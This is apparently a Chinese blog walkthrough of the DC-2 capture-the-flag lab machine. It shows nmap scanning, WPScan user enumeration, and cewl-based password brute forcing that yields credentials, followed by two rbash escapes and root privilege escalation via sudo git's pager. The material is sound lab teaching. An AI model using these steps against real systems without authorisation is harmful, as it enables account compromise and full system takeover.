## 🔎 端口扫描

### nmap 速度参数说明

| 参数 | 含义 |
|------|------|
| **T1** | 最慢，几乎不会触发防火墙告警 |
| **T2** | 慢 |
| **T3** | 默认速度 |
| **T4** | 快，靶机环境常用 ✅ |
| **T5** | 最快，但容易丢包漏扫 |

使用 `-p-` 全端口扫描：

```bash
nmap -A -T4 -p- 192.168.67.132
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image3.png)

扫描结果发现开放了 **Web（80）** 和 **SSH（7744）** 两个端口。

## 🌐 信息收集

### 配置 hosts 解析

直接访问ip url变成了dc-2

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image4.png)


由于靶机使用域名 `dc-2`，需要在本地 hosts 文件中添加解析。


- **Windows 路径**：`C:\Windows\System32\drivers\etc\hosts`
- **Linux 路径**：`/etc/hosts`

Linux 系统可以使用以下命令添加解析：
```bash
echo "192.168.67.132 dc-2" >> /etc/hosts
```
Windows 系统需要以管理员身份打开记事本编辑 hosts 文件，添加以下行：
```
192.168.67.132 dc-2
```
![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image5.png)

在网页底部可以看到 CMS 指纹信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image6.png)

## 🔧 WPScan 用户枚举

**WPScan** 是一款专门针对 **WordPress** 网站的黑盒扫描器，是渗透测试中处理此类 CMS 的"行业标准"工具。

### 常用命令

```bash
# 获取版本信息
wpscan --url http://dc-2

# 扫描插件
wpscan --url http://dc-2 --enumerate p

# 枚举用户
wpscan --url http://dc-2 --enumerate u
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image13.png)

枚举到三个用户，保存到 `users.txt`：

```bash
echo -e "admin\ntom\njerry" > users.txt
```

## 🔑 cewl 字典生成 + 密码爆破

### cewl 介绍

**cewl**（Custom Word List generator）是一个非常独特的自定义字典生成工具。

在渗透测试中，如果常规字典（如 rockyou.txt）爆破失败，渗透者会使用 cewl 针对目标网站进行"定制化"攻击。

**工作原理：**

1. **爬取网页**：像浏览器一样访问你指定的 URL
2. **提取单词**：抓取网页上所有的文字内容，并把每一个单词提取出来
3. **去重并汇总**：自动删掉重复的词，并过滤掉太短的词（默认少于 3 个字母不要），最后生成一个专门针对该网站的"词汇表"

```bash
cewl http://dc-2 -w passwords.txt
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image15.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image16.png)

### WPScan 密码爆破

```bash
wpscan --url http://dc-2 -U users.txt -P passwords.txt
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image17.png)

🎉 **爆破成功，获得两组凭据：**

```
[!] Valid Combinations Found:
| Username: jerry, Password: adipiscing
| Username: tom,   Password: parturient
```

### rbash 限制

登录后发现是 **rbash（受限 shell）**，很多命令无法使用，路径被限制，`/` 被禁止。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image21.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image22.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image23.png)

> 💡 **rbash 是什么？**  
> rbash（restricted bash）是 bash 的受限模式，限制用户执行包含 `/` 的命令、修改 PATH、使用重定向等操作，常用于限制低权限用户的操作范围。

### rbash 逃逸方式一：vi

```bash
vi
:set shell=/bin/bash
:shell
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image24.png)

逃出 rbash 后修复 PATH：

```bash
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
```


![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image26.png)

### rbash 逃逸方式二：BASH_CMDS（无需 vi）

```bash
BASH_CMDS[a]=/bin/sh;a      # 把 /bin/sh 注册为命令 a，执行后逃出 rbash
export PATH=$PATH:/bin/      # 将 /bin 加入 PATH 环境变量
export PATH=$PATH:/usr/bin   # 将 /usr/bin 加入 PATH 环境变量
```

> 💡 `BASH_CMDS` 是 bash 内置的命令哈希表，rbash 限制了外部命令执行，但无法阻止操作这个内置表，因此可以借此逃逸。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image27.png)

> 📖 更多 rbash 逃逸姿势参考：https://xz.aliyun.com/news/7237

## ⚡ git 提权

### 查找 sudo 权限

```bash
sudo -l
```

发现 jerry 可以免密以 root 身份运行 `/usr/bin/git`。

> 💡 除了 sudo，也可以查找 SUID 文件：
> ```bash
> find / -perm -u=s -type f 2>/dev/null
> ```
> 找到可疑的 SUID 二进制文件后，去 [GTFOBins](https://gtfobins.github.io/gtfobins/git/) 查找对应的利用方式。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image29.png)

### git pager 提权

```bash
sudo git -p help
```

进入 pager 界面后输入：

```
!/bin/sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image30.png)

🎉 **成功获取 root shell！**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image31.png)
